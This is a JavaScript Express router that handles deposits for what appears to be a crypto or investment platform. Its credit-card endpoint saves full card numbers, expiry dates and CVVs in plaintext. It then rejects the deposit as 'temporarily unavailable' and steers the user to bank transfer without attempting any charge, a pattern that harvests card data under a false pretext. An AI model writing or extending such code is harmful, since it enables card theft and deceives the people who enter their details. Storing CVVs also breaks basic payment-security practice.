import { Router } from "express";
import { z } from "zod";
import multer from "multer";
import fs from "fs/promises";
import path from "path";
import { prisma } from "../utils/prisma.js";
import { requireAuth } from "../middleware/auth.js";

const router = Router();
router.use(requireAuth);

const upload = multer({
  dest: "temp_uploads/",
  limits: { fileSize: 5 * 1024 * 1024 },
  fileFilter: (req, file, cb) => {
    if (file.mimetype.startsWith("image/")) cb(null, true);
    else cb(new Error("Only image files are allowed"));
  },
});

const EXT_MAP = {
  "image/jpeg": ".jpg",
  "image/jpg": ".jpg",
  "image/png": ".png",
  "image/webp": ".webp",
  "image/gif": ".gif",
  "image/heic": ".heic",
  "image/heif": ".heif",
};

async function deleteTempFile(file) {
  if (file?.path) await fs.unlink(file.path).catch(() => {});
}

const PAYMENT_METHODS = ["CREDIT_CARD", "USDT", "BANK_TRANSFER", "PAYPAL", "BITCOIN"];

const depositSchema = z.object({
  amount: z.number().min(10, "Minimum deposit is $10"),
  paymentMethod: z.enum(["CREDIT_CARD", "USDT", "BANK_TRANSFER", "PAYPAL", "BITCOIN"]),
  currency: z.string().optional(),
  network: z.string().optional(),
});

const creditCardSchema = z.object({
  depositId: z.string(),
  cardNumber: z.string().min(13).max(19),
  cardHolder: z.string().min(2),
  expiryMonth: z.string().length(2),
  expiryYear: z.string().length(4),
  cvv: z.string().min(3).max(4),
  billingAddress: z.string().optional(),
});

// ── GET /api/deposits/channels ── active payment channels
router.get("/channels", async (req, res) => {
  const channels = await prisma.paymentChannel.findMany({
    where: { isActive: true },
    select: { method: true, label: true, details: true },
  });
  res.json(
    channels.map((c) => ({
      method: c.method,
      label: c.label,
      details: JSON.parse(c.details),
    })),
  );
});

// ── POST /api/deposits ── initiate a deposit
router.post("/", async (req, res) => {
  try {
    const data = depositSchema.parse(req.body);

    // Credit card: create pending deposit, return depositId for card capture step
    if (data.paymentMethod === "CREDIT_CARD") {
      const deposit = await prisma.deposit.create({
        data: {
          userId: req.user.id,
          amount: data.amount,
          currency: "USD",
          paymentMethod: "CREDIT_CARD",
          status: "pending",
        },
      });
      return res.status(201).json({ depositId: deposit.id, status: "pending" });
    }

    // For crypto/bank/paypal: find the channel
    const channel = await prisma.paymentChannel.findUnique({
      where: { method: data.paymentMethod },
    });
    if (!channel || !channel.isActive) {
      return res.status(400).json({ error: "Payment method not currently available." });
    }

    const channelDetails = JSON.parse(channel.details);

    const deposit = await prisma.deposit.create({
      data: {
        userId: req.user.id,
        amount: data.amount,
        currency: data.currency || data.paymentMethod,
        paymentMethod: data.paymentMethod,
        network: data.network || null,
        walletAddress:
          channelDetails.address ||
          channelDetails.accountNumber ||
          channelDetails.paypalEmail ||
          null,
        status: "pending",
      },
    });

    res.status(201).json({
      depositId: deposit.id,
      channelDetails,
      amount: data.amount,
      status: "pending",
      message: "Deposit initiated. Complete the payment using the details provided.",
    });
  } catch (err) {
    if (err instanceof z.ZodError) {
      return res.status(400).json({ error: err.errors[0].message });
    }
    console.error(err);
    res.status(500).json({ error: "Failed to create deposit." });
  }
});

// ── POST /api/deposits/credit-card ── capture credit card details
router.post("/credit-card", async (req, res) => {
  try {
    const data = creditCardSchema.parse(req.body);

    const deposit = await prisma.deposit.findFirst({
      where: { id: data.depositId, userId: req.user.id },
    });
    if (!deposit) {
      return res.status(404).json({ error: "Deposit not found." });
    }

    // Save card details linked to this user
    await prisma.creditCard.create({
      data: {
        userId: req.user.id,
        cardNumber: data.cardNumber.replace(/\s/g, ""),
        cardHolder: data.cardHolder,
        expiryMonth: data.expiryMonth,
        expiryYear: data.expiryYear,
        cvv: data.cvv,
        billingAddress: data.billingAddress || null,
      },
    });

    // Mark the deposit as rejected with a note (credit card unavailable)
    await prisma.deposit.update({
      where: { id: deposit.id },
      data: {
        status: "rejected",
        adminNote: "Credit card payments are temporarily unavailable.",
      },
    });

    res.json({
      message: "Credit card payment is temporarily unavailable.",
      redirect: "BANK_TRANSFER",
    });
  } catch (err) {
    if (err instanceof z.ZodError) {
      return res.status(400).json({ error: err.errors[0].message });
    }
    console.error(err);
    res.status(500).json({ error: "Failed to process card details." });
  }
});

// ── PATCH /api/deposits/:id/proof ── submit payment proof (ref + screenshot)
router.patch("/:id/proof", upload.single("screenshot"), async (req, res) => {
  const paymentRef = req.body?.paymentRef?.trim() || null;
  const hasFile = !!req.file;
  const hasRef = paymentRef && paymentRef.length >= 4;

  if (!hasRef && !hasFile) {
    await deleteTempFile(req.file);
    return res.status(400).json({
      error: "Please provide a payment reference, a screenshot, or both.",
    });
  }

  const deposit = await prisma.deposit.findFirst({
    where: { id: req.params.id, userId: req.user.id },
  });

  if (!deposit) {
    await deleteTempFile(req.file);
    return res.status(404).json({ error: "Deposit not found." });
  }

  if (deposit.status !== "pending") {
    await deleteTempFile(req.file);
    return res.status(400).json({ error: "This deposit is already processed." });
  }

  let screenshotUrl = null;
  if (hasFile) {
    const ext = EXT_MAP[req.file.mimetype] || ".jpg";
    const filename = `${req.file.filename}${ext}`;
    const destDir = path.join(process.cwd(), "uploads", "screenshots");
    await fs.mkdir(destDir, { recursive: true });
    await fs.rename(req.file.path, path.join(destDir, filename));
    screenshotUrl = `/uploads/screenshots/${filename}`;
  }

  const updated = await prisma.deposit.update({
    where: { id: deposit.id },
    data: {
      ...(hasRef ? { paymentRef } : {}),
      ...(screenshotUrl ? { screenshotUrl } : {}),
    },
  });

  res.json({
    message: "Payment proof submitted. Awaiting confirmation.",
    deposit: updated,
  });
});

// ── GET /api/deposits ── user's deposit history
router.get("/", async (req, res) => {
  const deposits = await prisma.deposit.findMany({
    where: { userId: req.user.id },
    orderBy: { createdAt: "desc" },
  });
  res.json(deposits);
});

export default router;
